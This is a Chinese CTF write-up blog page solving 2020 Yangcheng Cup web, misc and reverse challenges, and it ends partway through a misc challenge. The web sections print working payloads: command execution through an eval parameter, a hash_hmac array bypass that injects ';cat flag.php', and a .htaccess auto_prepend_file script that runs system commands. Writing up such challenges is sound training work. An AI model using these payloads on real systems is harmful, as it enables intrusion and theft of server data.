<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>2020年羊城杯网络安全大赛 | Lazzaro</title><meta name="description" content="​      WEBeasycon 一窝蚂蚁大概有500-2000只，而梵蒂冈只有800人，如果这窝蚂蚁入侵梵蒂冈，他们要提着菜刀才能解决这群蚂蚁，但是你并不关心你只关心你自己 183.129.189.60:10021  御剑扫描出index.php页面，访问提示eval post cmd， POST传参cmd&#x3D;system(&quot;ls -al&quot;);发现当前目录下有文件bbbbbb"><meta property="og:type" content="article"><meta property="og:title" content="2020年羊城杯网络安全大赛"><meta property="og:url" content="https://lazzzaro.github.io/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="​      WEBeasycon 一窝蚂蚁大概有500-2000只，而梵蒂冈只有800人，如果这窝蚂蚁入侵梵蒂冈，他们要提着菜刀才能解决这群蚂蚁，但是你并不关心你只关心你自己 183.129.189.60:10021  御剑扫描出index.php页面，访问提示eval post cmd， POST传参cmd&#x3D;system(&quot;ls -al&quot;);发现当前目录下有文件bbbbbb"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lazzzaro.github.io/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911214318915.png"><meta property="og:image" content="https://lazzzaro.github.io/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911214506859.png"><meta property="og:image" content="https://lazzzaro.github.io/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911215013098.png"><meta property="og:image" content="https://lazzzaro.github.io/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911215717482.png"><meta property="og:image" content="https://lazzzaro.github.io/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911220127001.png"><meta property="og:image" content="https://lazzzaro.github.io/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911220807587.png"><meta property="og:image" content="https://lazzzaro.github.io/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911220923352.png"><meta property="og:image" content="https://lazzzaro.github.io/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911223003888.png"><meta property="article:published_time" content="2020-09-10T15:56:20.000Z"><meta property="article:modified_time" content="2020-09-11T15:07:37.611Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="2020赛"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lazzzaro.github.io/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911214318915.png"><link rel="canonical" href="https://lazzzaro.github.io/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="https://cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Ft5J9t2Jl0eb5Zr",ck:"3Ft5J9t2Jl0eb5Zr",hashMode:!0})</script><meta name="generator" content="Hexo 7.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF弱鸡自进阶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">总览</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">汇总</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">类别</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">关键词</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">来留个言 👉👉👉</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">类别</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">50</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">关键词云</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020赛</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.86px">2021赛</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.57px">2022赛</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.71px">2023赛</a> <a href="/tags/2024%E8%B5%9B/" style="font-size:13.29px">2024赛</a> <a href="/tags/2025%E8%B5%9B/" style="font-size:13px">2025赛</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.14px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.29px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.14px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.14px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.43px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">内网</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">反编译</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">反调试</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">取证</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">后量子密码</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">命令行</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">图像</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">块密码</a> <a href="/tags/%E5%A0%86/" style="font-size:13px">堆</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.14px">密码</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">提权</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">文件上传</a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">曲线</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">格密码</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">格式化字符串</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">注入</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">流密码</a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">流量</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">混淆</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">渗透</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">离散对数</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.14px">算法</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.43px">绕过</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">编码</a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.14px">脚本</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">自动化</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">逃逸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.29px">隐写</a></div></div><div class="widget"><h3 class="widget-title">汇总</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">六月 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">十二月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">十一月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">三月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">九月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">九月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easycon"><span class="toc-number">1.1.</span> <span class="toc-text">easycon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BlackCat"><span class="toc-number">1.2.</span> <span class="toc-text">BlackCat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyphp"><span class="toc-number">1.3.</span> <span class="toc-text">easyphp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#com"><span class="toc-number">2.1.</span> <span class="toc-text">com</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-number">3.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#login"><span class="toc-number">3.1.</span> <span class="toc-text">login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bytecode"><span class="toc-number">3.2.</span> <span class="toc-text">Bytecode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyre"><span class="toc-number">3.3.</span> <span class="toc-text">easyre</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-match-2020年羊城杯网络安全大赛" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">2020年羊城杯网络安全大赛</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" class="article-date"><time datetime="2020-09-10T15:56:20.000Z" itemprop="datePublished">2020-09-10</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/match/">match</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/2020%E8%B5%9B/" rel="tag">2020赛</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" class="leancloud_visitors" data-flag-title="2020年羊城杯网络安全大赛"><span class="leancloud-visitors-count">∞</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/#comments" class="article-comment-link">评论</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>​</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h3><blockquote><p>一窝蚂蚁大概有500-2000只，而梵蒂冈只有800人，如果这窝蚂蚁入侵梵蒂冈，他们要提着菜刀才能解决这群蚂蚁，但是你并不关心你只关心你自己</p><p>183.129.189.60:10021</p></blockquote><p>御剑扫描出<code>index.php</code>页面，访问提示<code>eval post cmd</code>，</p><p>POST传参<code>cmd=system(&quot;ls -al&quot;);</code>发现当前目录下有文件<code>bbbbbbbbb.txt</code>：</p><p><img src="/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911214318915.png" alt="image-20200911214318915" style="zoom:67%"></p><p>回到页面访问，得到一串base64图片后缀字符串，加上base64头<code>data:image/png;base64,</code>，在URL访问得到图片中显示的flag：</p><p><img src="/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911214506859.png" alt="image-20200911214506859" style="zoom:50%"></p><p><strong>flag</strong>: GWHT{do_u_kn0w_c@idao}</p><p>​</p><h3 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h3><blockquote><p>眼睛瞪得像铜铃</p><p>183.129.189.60:10022</p></blockquote><p>查看源码发现提示<code>都说听听歌了！</code>，下载mp3文件查看16进制，发现最后有关键源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$clandestine</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    <span class="variable">$clandestine</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;White-cat-monitor&#x27;</span>], <span class="variable">$clandestine</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$hh</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>], <span class="variable">$clandestine</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$hh</span> !== <span class="variable">$_POST</span>[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;nc&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>需传入三个参数<code>Black-Cat-Sheriff</code>，<code>One-ear</code>，<code>White-cat-monitor</code>，用环境变量<code>clandestine</code>的值作为key对<code>White-cat-monitor</code>值进行sha256哈希运算，得到的结果再作为key用来对<code>One-ear</code>值进行sha256哈希运算，结果与<code>Black-Cat-Sheriff</code>相等则成功执行命令。</p><p>利用<code>hash_hmac</code>函数传入数组返回<code>false</code>的缺陷：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hmac</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="title function_ invoke__">Array</span>(), <span class="string">&quot;SecretKey&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hmac</span> == <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>传入数组返回<code>false</code>，再次运算时则无需key即可直接得到sha256哈希运算值。</p><p>通过修改<code>One-ear</code>命令及对应的<code>Black-Cat-Sheriff</code>值，最后拿到flag。</p><p><strong>payload:</strong></p><p><code>White-cat-monitor[]=&amp;One-ear=;cat flag.php&amp;Black-Cat-Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6</code></p><p><img src="/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911215013098.png" alt="image-20200911215013098" style="zoom:67%"></p><p><strong>flag:</strong> GWHT{y0u_mu3t_p@y_atTentiou_!0_lt}</p><p>参考：<a target="_blank" rel="noopener" href="https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up">SPOT THE BUG CHALLENGE 2018 WARM-UP</a></p><p>​</p><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><blockquote><p>Easyphp</p><p>183.129.189.60:10023</p></blockquote><p>题目逻辑：</p><p>访问时清除目录下除<code>index.php</code>文件外的其他文件，且只能写一次；另外限制字符为<code>a-z</code>和<code>.</code>，只有<code>index.php</code>文件解析，</p><p>考虑写入.htaccess文件，拆开关键字用<code>\</code>换行以绕过正则过滤，利用</p><p><code>php_value auto_prepend_file .htaccess</code></p><p>让php文件包含<code>.htaccess</code>文件，从而执行代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://183.129.189.60:10023/sandbox/74adfb351cd5c3621c62d62e0785f24c/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\\%0Ale%20&quot;.htaccess&quot;\n%23&lt;?php system(\&#x27;tac /fl&quot;a&quot;g\&#x27;);?&gt;\\&#x27;</span></span><br><span class="line">url2 = url + payload</span><br><span class="line">r = requests.get(url2)</span><br><span class="line">req = requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(req.content)</span><br></pre></td></tr></table></figure><p><img src="/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911215717482.png" alt="image-20200911215717482"></p><p><strong>flag:</strong> GWHT{easyApache}</p><p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1875219503fd">2019Xnuca Ezphp</a></p><p>​</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="com"><a href="#com" class="headerlink" title="com"></a>com</h3><blockquote><p>老知识？ nc ip port</p><p>183.129.189.60:10028</p></blockquote><p>nc，选择<code>[1] Sign in</code>得到多行多列数字，每行最后一个数字很大，易知为求解线性方程组。</p><p><img src="/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911220127001.png" alt="image-20200911220127001"></p><p>调整好list格式，导出A和B矩阵：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 